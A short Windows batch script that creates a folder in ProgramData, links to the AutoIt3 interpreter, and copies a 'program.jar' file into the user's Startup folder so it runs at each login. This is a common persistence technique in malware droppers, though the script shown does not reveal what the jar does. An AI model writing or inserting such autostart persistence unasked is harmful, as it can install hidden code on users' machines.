MKDIR "C:\\ProgramData\\recieve\\"
MKLINK "C:\\ProgramData\\recieve\\Autoit3.lnk" "C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe"
copy "%~dp0\\program.jar" "%HOMEDRIVE%%HOMEPATH%\\Start Menu\\Programs\\Startup\\program.jar"